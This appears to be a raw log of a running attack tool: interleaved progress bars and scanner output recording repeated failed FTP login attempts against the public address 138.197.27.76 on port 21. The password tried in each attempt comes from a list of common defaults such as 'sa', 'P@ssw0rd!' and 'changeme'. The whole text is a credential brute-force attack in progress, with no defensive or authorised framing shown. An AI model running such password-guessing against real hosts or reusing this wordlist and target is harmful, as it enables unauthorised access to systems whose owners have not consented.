2025-10-24 01:37:30,072 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.2%[0m ETA: 218.3s Speed: 149 B/s | 81.7s | PID: 44299
2025-10-24 01:37:30,354 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql (Incorrect: )
2025-10-24 01:37:30,481 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.4%[0m ETA: 82.8s Speed: 3 B/s | 217.2s | PID: 44124
2025-10-24 01:37:30,872 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlsql (Incorrect: )
2025-10-24 01:37:30,873 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.5%[0m ETA: 217.5s Speed: 150 B/s | 82.5s | PID: 44299
2025-10-24 01:37:31,281 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.7%[0m ETA: 82.0s Speed: 3 B/s | 218.0s | PID: 44124
2025-10-24 01:37:31,427 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :password1 (Incorrect: )
2025-10-24 01:37:31,674 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.8%[0m ETA: 216.7s Speed: 150 B/s | 83.3s | PID: 44299
2025-10-24 01:37:31,985 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :password123 (Incorrect: )
2025-10-24 01:37:32,082 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.9%[0m ETA: 81.2s Speed: 3 B/s | 218.8s | PID: 44124
2025-10-24 01:37:32,475 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.0%[0m ETA: 215.9s Speed: 149 B/s | 84.1s | PID: 44299
2025-10-24 01:37:32,530 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :complexpassword (Incorrect: )
2025-10-24 01:37:32,883 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m73.2%[0m ETA: 80.4s Speed: 3 B/s | 219.6s | PID: 44124
2025-10-24 01:37:33,057 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :database (Incorrect: )
2025-10-24 01:37:33,275 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.3%[0m ETA: 215.1s Speed: 150 B/s | 84.9s | PID: 44299
2025-10-24 01:37:33,584 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :server (Incorrect: )
2025-10-24 01:37:33,684 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m73.5%[0m ETA: 79.6s Speed: 3 B/s | 220.4s | PID: 44124
2025-10-24 01:37:34,076 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.6%[0m ETA: 214.3s Speed: 150 B/s | 85.7s | PID: 44299
2025-10-24 01:37:34,165 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :changeme (Incorrect: )
2025-10-24 01:37:34,486 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m73.7%[0m ETA: 78.8s Speed: 3 B/s | 221.2s | PID: 44124
2025-10-24 01:37:34,694 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :change (Incorrect: )
2025-10-24 01:37:34,878 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.9%[0m ETA: 213.4s Speed: 151 B/s | 86.6s | PID: 44299
2025-10-24 01:37:35,217 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlserver2000 (Incorrect: )
2025-10-24 01:37:35,294 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.0%[0m ETA: 78.0s Speed: 3 B/s | 222.0s | PID: 44124
2025-10-24 01:37:35,678 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.1%[0m ETA: 212.6s Speed: 151 B/s | 87.4s | PID: 44299
2025-10-24 01:37:35,737 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlserver2005 (Incorrect: )
2025-10-24 01:37:36,095 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.3%[0m ETA: 77.2s Speed: 3 B/s | 222.8s | PID: 44124
2025-10-24 01:37:36,258 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Sqlserver (Incorrect: )
2025-10-24 01:37:36,480 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.4%[0m ETA: 211.8s Speed: 152 B/s | 88.2s | PID: 44299
2025-10-24 01:37:36,779 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :SqlServer (Incorrect: )
2025-10-24 01:37:36,895 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.5%[0m ETA: 76.4s Speed: 3 B/s | 223.6s | PID: 44124
2025-10-24 01:37:37,280 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.7%[0m ETA: 211.0s Speed: 151 B/s | 89.0s | PID: 44299
2025-10-24 01:37:37,310 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Password1 (Incorrect: )
2025-10-24 01:37:37,696 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.8%[0m ETA: 75.6s Speed: 3 B/s | 224.4s | PID: 44124
2025-10-24 01:37:37,859 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Password2 (Incorrect: )
2025-10-24 01:37:38,081 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.9%[0m ETA: 210.2s Speed: 152 B/s | 89.8s | PID: 44299
2025-10-24 01:37:38,382 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@ssw0rd (Incorrect: )
2025-10-24 01:37:38,497 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.1%[0m ETA: 74.8s Speed: 3 B/s | 225.2s | PID: 44124
2025-10-24 01:37:38,882 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.2%[0m ETA: 209.4s Speed: 152 B/s | 90.6s | PID: 44299
2025-10-24 01:37:38,898 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@ssw0rd! (Incorrect: )
2025-10-24 01:37:39,297 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.3%[0m ETA: 74.0s Speed: 3 B/s | 226.0s | PID: 44124
2025-10-24 01:37:39,421 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@55w0rd! (Incorrect: )
2025-10-24 01:37:39,683 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.5%[0m ETA: 208.6s Speed: 153 B/s | 91.4s | PID: 44299
2025-10-24 01:37:39,961 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@ssword! (Incorrect: )
2025-10-24 01:37:40,098 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.6%[0m ETA: 73.2s Speed: 3 B/s | 226.8s | PID: 44124
2025-10-24 01:37:40,483 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Password! (Incorrect: )
2025-10-24 01:37:40,484 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m30.7%[0m ETA: 207.8s Speed: 154 B/s | 92.2s | PID: 44299
2025-10-24 01:37:40,898 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.9%[0m ETA: 72.4s Speed: 3 B/s | 227.6s | PID: 44124
2025-10-24 01:37:41,007 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :password! (Incorrect: )
2025-10-24 01:37:41,285 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.0%[0m ETA: 207.0s Speed: 153 B/s | 93.0s | PID: 44299
2025-10-24 01:37:41,528 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlsvr (Incorrect: )
2025-10-24 01:37:41,699 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.1%[0m ETA: 71.6s Speed: 3 B/s | 228.4s | PID: 44124
2025-10-24 01:37:42,052 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlaccount (Incorrect: )
2025-10-24 01:37:42,086 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.3%[0m ETA: 206.2s Speed: 154 B/s | 93.8s | PID: 44299
2025-10-24 01:37:42,501 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.4%[0m ETA: 70.8s Speed: 3 B/s | 229.2s | PID: 44124
2025-10-24 01:37:42,578 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :account (Incorrect: )
2025-10-24 01:37:42,887 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.5%[0m ETA: 205.4s Speed: 154 B/s | 94.6s | PID: 44299
2025-10-24 01:37:43,103 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sasa (Incorrect: )
2025-10-24 01:37:43,302 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.7%[0m ETA: 70.0s Speed: 3 B/s | 230.0s | PID: 44124
2025-10-24 01:37:43,623 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sa (Incorrect: )
2025-10-24 01:37:43,688 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m31.8%[0m ETA: 204.6s Speed: 154 B/s | 95.4s | PID: 44299
2025-10-24 01:37:44,103 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m76.9%[0m ETA: 69.2s Speed: 3 B/s | 230.8s | PID: 44124
2025-10-24 01:37:44,179 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :administator (Incorrect: )
2025-10-24 01:37:44,488 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.1%[0m ETA: 203.8s Speed: 154 B/s | 96.2s | PID: 44299
2025-10-24 01:37:44,745 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :pass (Incorrect: )
2025-10-24 01:37:44,904 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.2%[0m ETA: 68.4s Speed: 3 B/s | 231.6s | PID: 44124
2025-10-24 01:37:45,287 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql (Incorrect: )
2025-10-24 01:37:45,288 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.3%[0m ETA: 203.0s Speed: 155 B/s | 97.0s | PID: 44299
2025-10-24 01:37:45,705 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.5%[0m ETA: 67.6s Speed: 3 B/s | 232.4s | PID: 44124
2025-10-24 01:37:45,809 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :microsoft (Incorrect: )
2025-10-24 01:37:46,089 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.6%[0m ETA: 202.2s Speed: 155 B/s | 97.8s | PID: 44299
2025-10-24 01:37:46,328 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlserver (Incorrect: )
2025-10-24 01:37:46,506 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.7%[0m ETA: 66.8s Speed: 3 B/s | 233.2s | PID: 44124
2025-10-24 01:37:46,860 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sa (Incorrect: )
2025-10-24 01:37:46,891 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m32.9%[0m ETA: 201.4s Speed: 155 B/s | 98.6s | PID: 44299
2025-10-24 01:37:47,307 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.0%[0m ETA: 66.0s Speed: 3 B/s | 234.0s | PID: 44124
2025-10-24 01:37:47,419 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :hugs (Incorrect: )
2025-10-24 01:37:47,693 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.1%[0m ETA: 200.6s Speed: 155 B/s | 99.4s | PID: 44299
2025-10-24 01:37:47,942 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sasa (Incorrect: )
2025-10-24 01:37:48,108 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.3%[0m ETA: 65.2s Speed: 3 B/s | 234.8s | PID: 44124
2025-10-24 01:37:48,471 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :welcome (Incorrect: )
2025-10-24 01:37:48,495 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.4%[0m ETA: 199.8s Speed: 156 B/s | 100.2s | PID: 44299
2025-10-24 01:37:48,910 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.5%[0m ETA: 64.4s Speed: 3 B/s | 235.6s | PID: 44124
2025-10-24 01:37:49,025 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :welcome1 (Incorrect: )
2025-10-24 01:37:49,296 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.7%[0m ETA: 199.0s Speed: 155 B/s | 101.0s | PID: 44299
2025-10-24 01:37:49,566 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :welcome2 (Incorrect: )
2025-10-24 01:37:49,711 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.8%[0m ETA: 63.6s Speed: 3 B/s | 236.4s | PID: 44124
2025-10-24 01:37:50,090 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :march2011 (Incorrect: )
2025-10-24 01:37:50,096 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m33.9%[0m ETA: 198.2s Speed: 156 B/s | 101.8s | PID: 44299
2025-10-24 01:37:50,512 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.1%[0m ETA: 62.8s Speed: 3 B/s | 237.2s | PID: 44124
2025-10-24 01:37:50,610 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlpass (Incorrect: )
2025-10-24 01:37:50,897 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.2%[0m ETA: 197.4s Speed: 156 B/s | 102.6s | PID: 44299
2025-10-24 01:37:51,135 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlpassword (Incorrect: )
2025-10-24 01:37:51,314 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.3%[0m ETA: 62.0s Speed: 3 B/s | 238.0s | PID: 44124
2025-10-24 01:37:51,689 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :guessme (Incorrect: )
2025-10-24 01:37:51,698 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.5%[0m ETA: 196.6s Speed: 157 B/s | 103.4s | PID: 44299
2025-10-24 01:37:52,115 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.6%[0m ETA: 61.2s Speed: 3 B/s | 238.8s | PID: 44124
2025-10-24 01:37:52,211 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :bird (Incorrect: )
2025-10-24 01:37:52,499 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m34.7%[0m ETA: 195.8s Speed: 156 B/s | 104.2s | PID: 44299
2025-10-24 01:37:52,754 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@55w0rd! (Incorrect: )
2025-10-24 01:37:52,916 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.9%[0m ETA: 60.4s Speed: 3 B/s | 239.6s | PID: 44124
2025-10-24 01:37:53,274 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :test (Incorrect: )
2025-10-24 01:37:53,300 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.0%[0m ETA: 195.0s Speed: 157 B/s | 105.0s | PID: 44299
2025-10-24 01:37:53,717 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.1%[0m ETA: 59.6s Speed: 3 B/s | 240.4s | PID: 44124
2025-10-24 01:37:53,847 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :dev (Incorrect: )
2025-10-24 01:37:54,100 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.3%[0m ETA: 194.2s Speed: 157 B/s | 105.8s | PID: 44299
2025-10-24 01:37:54,378 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :devdev (Incorrect: )
2025-10-24 01:37:54,519 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.4%[0m ETA: 58.8s Speed: 2 B/s | 241.2s | PID: 44124
2025-10-24 01:37:54,902 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.5%[0m ETA: 193.4s Speed: 156 B/s | 106.6s | PID: 44299
2025-10-24 01:37:54,919 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :devdevdev (Incorrect: )
2025-10-24 01:37:55,321 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.7%[0m ETA: 58.0s Speed: 2 B/s | 242.0s | PID: 44124
2025-10-24 01:37:55,441 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :qa (Incorrect: )
2025-10-24 01:37:55,702 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m35.8%[0m ETA: 192.6s Speed: 157 B/s | 107.4s | PID: 44299
2025-10-24 01:37:55,971 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :god (Incorrect: )
2025-10-24 01:37:56,121 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.9%[0m ETA: 57.2s Speed: 2 B/s | 242.8s | PID: 44124
2025-10-24 01:37:56,489 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :admin (Incorrect: )
2025-10-24 01:37:56,504 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.1%[0m ETA: 191.8s Speed: 158 B/s | 108.2s | PID: 44299
2025-10-24 01:37:56,923 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.2%[0m ETA: 56.4s Speed: 2 B/s | 243.6s | PID: 44124
2025-10-24 01:37:57,010 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :adminadmin (Incorrect: )
2025-10-24 01:37:57,305 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.3%[0m ETA: 191.0s Speed: 157 B/s | 109.0s | PID: 44299
2025-10-24 01:37:57,540 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :admins (Incorrect: )
2025-10-24 01:37:57,725 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.5%[0m ETA: 55.6s Speed: 2 B/s | 244.4s | PID: 44124
2025-10-24 01:37:58,094 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :goat (Incorrect: )
2025-10-24 01:37:58,107 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████[38;5;240m░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.6%[0m ETA: 190.2s Speed: 158 B/s | 109.8s | PID: 44299
2025-10-24 01:37:58,526 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.7%[0m ETA: 54.8s Speed: 2 B/s | 245.2s | PID: 44124
2025-10-24 01:37:58,635 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sysadmin (Incorrect: )
2025-10-24 01:37:58,910 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m36.9%[0m ETA: 189.4s Speed: 158 B/s | 110.6s | PID: 44299
2025-10-24 01:37:59,165 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :water (Incorrect: )
2025-10-24 01:37:59,327 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.0%[0m ETA: 54.0s Speed: 2 B/s | 246.0s | PID: 44124
2025-10-24 01:37:59,693 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :dirt (Incorrect: )
2025-10-24 01:37:59,710 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████[38;5;240m░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m37.1%[0m ETA: 188.6s Speed: 158 B/s | 111.4s | PID: 44299
2025-10-24 01:38:00,128 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.3%[0m ETA: 53.2s Speed: 2 B/s | 246.8s | PID: 44124
2025-10-24 01:38:00,228 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :air (Incorrect: )
